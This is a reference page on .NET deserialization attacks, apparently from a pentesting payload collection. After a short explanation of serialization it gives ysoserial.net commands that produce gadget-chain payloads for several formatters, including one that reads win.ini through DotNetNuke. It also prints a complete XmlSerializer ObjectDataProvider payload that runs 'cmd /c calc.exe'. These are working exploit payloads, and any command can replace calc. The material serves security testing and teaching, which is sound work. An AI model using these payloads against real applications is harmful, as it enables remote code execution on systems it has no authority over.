# Serialization

### Notes
- Purpose is to convert a data structure into a format that can be stored or transmitted over a network link for future consumption.
- Involves a "producer" and a "consumer" of the serialized object. 
- E.g. An application can define and instantiate an arbitrary object and modify its state in some way. It can then store the state of that object in the appropriate format (for example a binary file) using serialization. As long as the format of the saved file is understood by the "consumer" application, the object can be recreated in the process space of the consumer and further processed as desired.
- There are various formats in which the serialized objects can be stored such as JSON and XML.

### .NET Serialization

**Tools**

* [pwntester/ysoserial.net - Deserialization payload generator for a variety of .NET formatters](https://github.com/pwntester/ysoserial.net)
```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
$ ./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
$ ./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
$ ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

**Formatters**

![NETNativeFormatters.png](/img/dotnet-native-formatters.png?raw=true)

**XmlSerializer**

* In C# source code, look for `XmlSerializer(typeof(<TYPE>));`.
* The attacker must control the **type** of the XmlSerializer.
* Payload output: **XML**

```xml
.\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
```
